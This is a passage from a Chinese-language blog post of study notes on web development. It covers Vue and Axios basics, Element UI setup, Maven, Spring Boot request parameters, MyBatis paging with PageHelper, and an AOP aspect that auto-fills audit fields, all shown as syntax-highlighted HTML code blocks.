class="number">19</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">gender</span>:<span class="number">2</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">score</span>:<span class="number">40</span></span></span><br><span class="line"><span class="language-javascript">            &#125;]</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="生命周期"><a href="#生命周期" class="headerlink" title="生命周期"></a>生命周期</h3><p>掌握<code>mounted</code>即可</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">mounted</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&quot;Vue挂载完成，发送请求到服务端&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Axios入门"><a href="#Axios入门" class="headerlink" title="Axios入门"></a>Axios入门</h2><p>引入<code>Axios</code>的<code>js</code>文件</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>使用方式</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=<span class="string">&quot;button&quot;</span> value=<span class="string">&quot;获取数据GET&quot;</span> onclick=<span class="string">&quot;get()&quot;</span>&gt;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">get</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="comment">// 通过axios发送异步请求-get</span></span><br><span class="line">        <span class="title function_">axios</span>(&#123;</span><br><span class="line">            <span class="attr">method</span>:<span class="string">&quot;get&quot;</span>,</span><br><span class="line">            <span class="attr">url</span>:<span class="string">&quot;&quot;</span></span><br><span class="line">        &#125;).<span class="title function_">then</span>(<span class="function"><span class="params">result</span>=&gt;</span> &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(result.<span class="property">data</span>)</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">axios.<span class="title function_">get</span>(<span class="string">&quot;url&quot;</span>).<span class="title function_">then</span>(<span class="function"><span class="params">result</span>=&gt;</span>&#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(result.<span class="property">data</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">axios.<span class="title function_">post</span>(<span class="string">&quot;url&quot;</span>, <span class="string">&quot;id=1&quot;</span>).<span class="title function_">then</span>(<span class="function"><span class="params">result</span>=&gt;</span>&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(result.<span class="property">data</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="前端工程化"><a href="#前端工程化" class="headerlink" title="前端工程化"></a>前端工程化</h2><h3 id="Vue组件库Element"><a href="#Vue组件库Element" class="headerlink" title="Vue组件库Element"></a>Vue组件库Element</h3><h4 id="快速入门"><a href="#快速入门" class="headerlink" title="快速入门"></a>快速入门</h4><ol><li><a href="https://element.eleme.cn/#/zh-CN/component/installation">组件 | Element</a></li></ol><h4 id="Element-组件库"><a href="#Element-组件库" class="headerlink" title="Element 组件库"></a>Element 组件库</h4><ol><li>安装<code>ElementUI</code></li></ol><blockquote><p>npm install element-ui</p></blockquote><ol start="2"><li>引入</li></ol><blockquote><p>import ElementUI from ‘element-ui’;</p><p>import ‘element-ui&#x2F;lib&#x2F;theme-chalk&#x2F;index.css’</p><p>Vue.use(ElementUI)</p></blockquote><ol start="3"><li>访问官网，复制组件代码</li></ol><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Table 表格</span><br><span class="line">Pagination 分页</span><br><span class="line">Dialog 对话框</span><br><span class="line">Form 表单</span><br><span class="line">Container 基本页面布局</span><br><span class="line">使用axios异步加载数据</span><br><span class="line">vue 路由</span><br></pre></td></tr></table></figure><ol start="4"><li>Nginx 打包部署</li></ol><p><img src="/2024/07/17/web%E5%BC%80%E5%8F%91/image-20240720163404111.png" alt="image-20240720163404111"></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">先 npm run build 得到 dist 文件夹，将里面的内容放入 html 文件夹中执行即可本地部署</span><br></pre></td></tr></table></figure><h1 id="web后端"><a href="#web后端" class="headerlink" title="web后端"></a>web后端</h1><h2 id="maven"><a href="#maven" class="headerlink" title="maven"></a>maven</h2><h3 id="依赖管理"><a href="#依赖管理" class="headerlink" title="依赖管理"></a>依赖管理</h3><p><img src="/2024/07/17/web%E5%BC%80%E5%8F%91/image-20240722101945487.png" alt="image-20240722101945487"></p><p>在<code>pom.xml</code>文件中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--    依赖配置    --&gt;</span><br><span class="line">    &lt;dependencies&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;ch.qos.logback&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;logback-classic&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;<span class="number">1.2</span><span class="number">.3</span>&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">    &lt;/dependencies&gt;</span><br></pre></td></tr></table></figure><h3 id="依赖范围"><a href="#依赖范围" class="headerlink" title="依赖范围"></a>依赖范围</h3><p><img src="/2024/07/17/web%E5%BC%80%E5%8F%91/image-20240722103207674.png" alt="image-20240722103207674"></p><h3 id="生命周期-1"><a href="#生命周期-1" class="headerlink" title="生命周期"></a>生命周期</h3><p><img src="/2024/07/17/web%E5%BC%80%E5%8F%91/image-20240722103422908.png" alt="image-20240722103422908"></p><h2 id="SpringBootWeb入门"><a href="#SpringBootWeb入门" class="headerlink" title="SpringBootWeb入门"></a>SpringBootWeb入门</h2><h3 id="Postman"><a href="#Postman" class="headerlink" title="Postman"></a>Postman</h3><h4 id="请求"><a href="#请求" class="headerlink" title="请求"></a>请求</h4><h5 id="简单参数-实体参数"><a href="#简单参数-实体参数" class="headerlink" title="简单参数&amp;实体参数"></a>简单参数&amp;实体参数</h5><p><code>GET</code>和<code>POST</code>方式相同</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">// 原始方式</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/simpleParam&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">simpleParam</span><span class="params">(HttpServletRequest request)</span> &#123;</span><br><span class="line">        <span class="comment">// 获取请求参数</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">ageStr</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;age&quot;</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">age</span> <span class="operator">=</span> Integer.parseInt(ageStr);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;name:&quot;</span> + name + <span class="string">&quot;, age:&quot;</span> + age);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;OK&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// springboot 方式</span></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/simpleParam&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">simpleParam</span><span class="params">(String name, Integer age)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;name:&quot;</span> + name + <span class="string">&quot;, age:&quot;</span> + age);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;OK&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 参数必须要对应</span></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/simpleParam&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">simpleParam</span><span class="params">(<span class="meta">@RequestParam(name = &quot;name&quot;)</span> String username, Integer age)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;name:&quot;</span> + username + <span class="string">&quot;, age:&quot;</span> + age);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;OK&quot;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/07/17/web%E5%BC%80%E5%8F%91/image-20240722173221845.png" alt="image-20240722173221845"></p><h2 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h2><p>略</p><h2 id="MyBatis"><a href="#MyBatis" class="headerlink" title="MyBatis"></a>MyBatis</h2><h3 id="Mybatis入门"><a href="#Mybatis入门" class="headerlink" title="Mybatis入门"></a>Mybatis入门</h3><h4 id="lombok"><a href="#lombok" class="headerlink" title="lombok"></a>lombok</h4><p><img src="/2024/07/17/web%E5%BC%80%E5%8F%91/image-20240801101634571.png" alt="image-20240801101634571"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Getter</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Setter</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@ToString</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@EqualsAndHashCode</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@Data</span>               <span class="comment">// Data包括上面4个</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span> <span class="comment">// 有参构造</span></span><br><span class="line"><span class="meta">@NoArgsConstructor</span>  <span class="comment">// 无参构造</span></span><br></pre></td></tr></table></figure><h3 id="Mybatis基础增删改查"><a href="#Mybatis基础增删改查" class="headerlink" title="Mybatis基础增删改查"></a>Mybatis基础增删改查</h3><p><img src="/2024/07/17/web%E5%BC%80%E5%8F%91/image-20240801113119990.png" alt="image-20240801113119990"></p><p><img src="/2024/07/17/web%E5%BC%80%E5%8F%91/image-20240801135948809.png" alt="image-20240801135948809"></p><p><img src="/2024/07/17/web%E5%BC%80%E5%8F%91/image-20240801141949293.png" alt="image-20240801141949293"></p><h1 id="业务系统代码"><a href="#业务系统代码" class="headerlink" title="业务系统代码"></a>业务系统代码</h1><h2 id="分页查询-pageHelper"><a href="#分页查询-pageHelper" class="headerlink" title="分页查询(pageHelper)"></a>分页查询(pageHelper)</h2><p><strong>controller</strong>层返回Result对象，里面封装PageResult对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PageResult</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">long</span> total; <span class="comment">//总记录数</span></span><br><span class="line">    <span class="keyword">private</span> List records; <span class="comment">//当前页数据集合</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// controller 层</span></span><br><span class="line"><span class="meta">@GetMapping(&quot;/page&quot;)</span></span><br><span class="line">    <span class="meta">@ApiOperation(value = &quot;分页查询&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> Result <span class="title function_">pagenation</span><span class="params">(EmployeePageQueryDTO employeePageQueryDTO)</span> &#123;</span><br><span class="line">        log.info(<span class="string">&quot;员工分页查询： employeePageQueryDTO:&#123;&#125;&quot;</span>, employeePageQueryDTO);</span><br><span class="line">        <span class="type">PageResult</span> <span class="variable">page</span> <span class="operator">=</span> employeeService.pageQuery(employeePageQueryDTO);</span><br><span class="line">        <span class="keyword">return</span> Result.success(page);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// serviceImpl层</span></span><br><span class="line">    <span class="keyword">public</span> PageResult <span class="title function_">pageQuery</span><span class="params">(EmployeePageQueryDTO employeePageQueryDTO)</span> &#123;</span><br><span class="line">        <span class="comment">// Service 调用 PageHelper 返回 PageResult 对象</span></span><br><span class="line">        PageHelper.startPage(employeePageQueryDTO.getPage(), employeePageQueryDTO.getPageSize());</span><br><span class="line"><span class="comment">// mapper返回查询到的员工数据封装到PageResult中</span></span><br><span class="line">        Page&lt;Employee&gt; page = employeeMapper.page(employeePageQueryDTO);</span><br><span class="line"></span><br><span class="line">        <span class="type">long</span> <span class="variable">total</span> <span class="operator">=</span> page.getTotal();</span><br><span class="line">        List&lt;Employee&gt; records = page.getResult();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">PageResult</span>(total, records);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">&lt;</span><span class="operator">!</span><span class="comment">--使用 PageHelper 插件自动填充 limit page, pageSize 参数--&gt;</span></span><br><span class="line"><span class="operator">&lt;</span><span class="operator">!</span><span class="comment">--模糊查询用like--&gt;</span></span><br><span class="line"><span class="operator">&lt;</span><span class="keyword">select</span> id<span class="operator">=</span>&quot;page&quot; resultType<span class="operator">=</span>&quot;com.sky.entity.Employee&quot;<span class="operator">&gt;</span></span><br><span class="line">    <span class="keyword">select</span> <span class="operator">*</span></span><br><span class="line">    <span class="keyword">from</span> sky_take_out.employee</span><br><span class="line">    <span class="operator">&lt;</span><span class="keyword">where</span><span class="operator">&gt;</span></span><br><span class="line">        <span class="operator">&lt;</span>if test<span class="operator">=</span>&quot;name != null and name != &#x27;&#x27;&quot;<span class="operator">&gt;</span></span><br><span class="line">            name <span class="keyword">like</span> concat(<span class="string">&#x27;%&#x27;</span>, #&#123;name&#125;, <span class="string">&#x27;%&#x27;</span>)</span><br><span class="line">        <span class="operator">&lt;</span><span class="operator">/</span>if<span class="operator">&gt;</span></span><br><span class="line">    <span class="operator">&lt;</span><span class="operator">/</span><span class="keyword">where</span><span class="operator">&gt;</span></span><br><span class="line">    <span class="keyword">order</span> <span class="keyword">by</span> create_time <span class="keyword">desc</span></span><br><span class="line"><span class="operator">&lt;</span><span class="operator">/</span><span class="keyword">select</span><span class="operator">&gt;</span></span><br></pre></td></tr></table></figure><h2 id="修改日期格式-消息转换器"><a href="#修改日期格式-消息转换器" class="headerlink" title="修改日期格式(消息转换器)"></a>修改日期格式(消息转换器)</h2><p>注解法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@JsonFormat(pattern = &quot;yyyy-MM-dd HH:mm:ss&quot;)</span></span><br><span class="line"><span class="keyword">private</span> LocalDateTime createTime;</span><br></pre></td></tr></table></figure><p>扩展Spring MVC框架的信息转化器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">   <span class="comment">// JacksonObjectMapper对象是一个自己写好的日期格式转换器</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">extendMessageConverters</span><span class="params">(List&lt;HttpMessageConverter&lt;?&gt;&gt; converters)</span> &#123;</span><br><span class="line">       log.info(<span class="string">&quot;扩展消息转换器&quot;</span>);</span><br><span class="line">       <span class="comment">// 创建一个消息转换器</span></span><br><span class="line">       <span class="type">MappingJackson2HttpMessageConverter</span> <span class="variable">converter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MappingJackson2HttpMessageConverter</span>();</span><br><span class="line">       <span class="comment">// 并设置一个对象转换器，对象转换器可以将Java对象序列化为json数据</span></span><br><span class="line">       converter.setObjectMapper(<span class="keyword">new</span> <span class="title class_">JacksonObjectMapper</span>());</span><br><span class="line">       <span class="comment">// 将自己设置好的消息转换器加入容器中</span></span><br><span class="line">       converters.add(<span class="number">0</span>, converter);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2 id="数据库关联"><a href="#数据库关联" class="headerlink" title="数据库关联"></a>数据库关联</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">deleteById</span><span class="params">(Long id)</span> &#123;</span><br><span class="line">    <span class="comment">//查询当前分类是否关联了菜品，如果关联了就抛出业务异常</span></span><br><span class="line">    <span class="type">Integer</span> <span class="variable">count</span> <span class="operator">=</span> dishMapper.countByCategoryId(id);</span><br><span class="line">    <span class="keyword">if</span>(count &gt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="comment">//当前分类下有菜品，不能删除</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">DeletionNotAllowedException</span>(MessageConstant.CATEGORY_BE_RELATED_BY_DISH);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//查询当前分类是否关联了套餐，如果关联了就抛出业务异常</span></span><br><span class="line">    count = setmealMapper.countByCategoryId(id);</span><br><span class="line">    <span class="keyword">if</span>(count &gt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="comment">//当前分类下有菜品，不能删除</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">DeletionNotAllowedException</span>(MessageConstant.CATEGORY_BE_RELATED_BY_SETMEAL);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//删除分类数据</span></span><br><span class="line">    categoryMapper.deleteById(id);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="AOP"><a href="#AOP" class="headerlink" title="AOP"></a>AOP</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//设置创建时间、修改时间、创建人、修改人时category和employee都要重新写一遍代码，所以找到公共字段进行填充</span><br><span class="line">employee.setCreateTime(LocalDateTime.now());</span><br><span class="line">category.setUpdateTime(LocalDateTime.now());</span><br><span class="line">category.setCreateUser(BaseContext.getCurrentId());</span><br><span class="line">category.setUpdateUser(BaseContext.getCurrentId());</span><br></pre></td></tr></table></figure><p>自定义注解</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 自定义注解，用于标识某个方法需要进行功能字段自动填充处理</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Target(ElementType.METHOD)</span></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> AutoFill &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 数据库操作类型，UPDATE INSERT</span></span><br><span class="line">    OperationType <span class="title function_">value</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>自定义切面类（AutoFillAspect）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 自定义切面，实现公共字段填充逻辑处理</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Aspect</span>     <span class="comment">// 切面类</span></span><br><span class="line"><span class="meta">@Component</span>  <span class="comment">// IOC容器</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AutoFillAspect</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 切入点</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="comment">// 拦截所有mapper文件下所有 含有@AutoFill注解的 方法</span></span><br><span class="line">    <span class="meta">@Pointcut(&quot;execution(* com.sky.mapper.*.*(..)) &amp;&amp; @annotation(com.sky.annotation.AutoFill)&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">autoFillAspect</span><span class="params">()</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 前置通知，在通知中进行公共字段的赋值</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Before(&quot;autoFillAspect()&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">autoFill</span><span class="params">(JoinPoint joinPoint)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        log.info(<span class="string">&quot;Auto filling aspect: 开始公共字段的赋值&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取数据库操作类型INSERT UPDATE</span></span><br><span class="line">        <span class="type">MethodSignature</span> <span class="variable">signature</span> <span class="operator">=</span> (MethodSignature) joinPoint.getSignature(); <span class="comment">// 方法签名对象</span></span><br><span class="line">        <span class="type">AutoFill</span> <span class="variable">autoFill</span> <span class="operator">=</span> signature.getMethod().getAnnotation(AutoFill.class);<span class="comment">// 获得方法上的注解对象</span></span><br><span class="line">        <span class="type">OperationType</span> <span class="variable">operationType</span> <span class="operator">=</span> autoFill.value(); <span class="comment">// 获得数据库操作类型</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获得被拦截的方法参数，实体对象</span></span><br><span class="line">        Object[] args = joinPoint.getArgs();</span><br><span class="line">        <span class="keyword">if</span> (args == <span class="literal">null</span> || args.length == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">entity</span> <span class="operator">=</span> args[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 准备赋值的数据</span></span><br><span class="line">        <span class="type">LocalDateTime</span> <span class="variable">now</span> <span class="operator">=</span> LocalDateTime.now();</span><br><span class="line">        <span class="type">Long</span> <span class="variable">currentId</span> <span class="operator">=</span> BaseContext.getCurrentId();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 根据不同的操作类型，为对应属性通过反射来赋值</span></span><br><span class="line">        <span class="keyword">if</span> (operationType == OperationType.INSERT) &#123;</span><br><span class="line">            <span class="type">Method</span> <span class="variable">setCreateTime</span> <span class="operator">=</span> entity.getClass().getDeclaredMethod(AutoFillConstant.SET_CREATE_TIME, LocalDateTime.class);</span><br><span class="line">            <span class="type">Method</span> <span class="variable">setCreateUser</span> <span class="operator">=</span> entity.getClass().getDeclaredMethod(AutoFillConstant.SET_CREATE_USER, Long.class);</span><br><span class="line">            <span class="type">Method</span> <span class="variable">setUpdateTime</span> <span class="operator">=</span> entity.getClass().getDeclaredMethod(AutoFillConstant.SET_UPDATE_TIME, LocalDateTime.class);</span><br><span class="line">            <span class="type">Method</span> <span class="variable">setUpdateUser</span> <span class="operator">=</span> entity.getClass().getDeclaredMethod(AutoFillConstant.SET_UPDATE_USER, Long.class);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 通过反射为对象属性赋值</span></span><br><span class="line">            setCreateTime.invoke(entity, now);</span><br><span class="line">            setCreateUser.invoke(entity, currentId);</span><br><span class="line">            setUpdateTime.invoke(entity, now);</span><br><span class="line">            setUpdateUser.invoke(entity, currentId);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (operationType == OperationType.UPDATE) &#123;</span><br><span class="line">            <span class="type">Method</span> <span class="variable">setUpdateTime</span> <span class="operator">=</span> entity.getClass().getDeclaredMethod(AutoFillConstant.SET_UPDATE_TIME, LocalDateTime.class);</span><br><span class="line">            <span class="type">Method</span> <span class="variable">setUpdateUser</span> <span class="operator">=</span> entity.getClass().getDeclaredMethod(AutoFillConstant.SET_UPDATE_USER, Long.class);</span><br><span class="line">            setUpdateTime.invoke(entity, now);</span><br><span class="line">            setUpdateUser.invoke(entity, currentId);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="配置类"><a href="#配置类" class="headerlink" title="配置类"></a>配置类</h2><p>第三方实现的工具类对象引入需要通过配置类导入spring容器中。</p><p>实现配置类对象创建一个第三方类对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 配置类，用于创建AliOssUtil对象</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span 